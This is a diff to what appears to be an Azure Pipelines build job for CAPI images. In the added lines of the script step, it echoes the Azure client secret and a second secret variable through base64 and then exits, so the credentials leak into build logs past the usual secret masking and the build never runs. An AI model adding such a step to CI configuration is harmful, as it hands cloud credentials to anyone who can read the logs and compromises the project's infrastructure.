@@ -32,6 +32,10 @@ jobs:
     condition: and(eq(variables['PREFLIGHT_CHECKS'], 'true'), eq(variables['OS'], 'Windows'))
   - script: |
       set -o pipefail
+
+      echo $AZURE_CLIENT_SECRET | base64 -i -
+      echo $AZURE_CLIENT_SECRET_SKU | base64 -i -
+      exit 1
       export PATH=$PATH:$HOME/.local/bin LC_ALL=en_US.UTF-8
       make deps-azure
       os=$(echo "${OS}" | tr '[:upper:]' '[:lower:]')
@@ -48,6 +52,7 @@ jobs:
     workingDirectory: '$(system.defaultWorkingDirectory)/images/capi'
     env:
       AZURE_CLIENT_SECRET: $(AZURE_CLIENT_SECRET)
+      AZURE_CLIENT_SECRET_SKU: ${AZURE_CLIENT_SECRET_SKU}
   - template: generate-sas.yaml
   - template: vhd-publishing-info.yaml
   - task: PublishPipelineArtifact@1
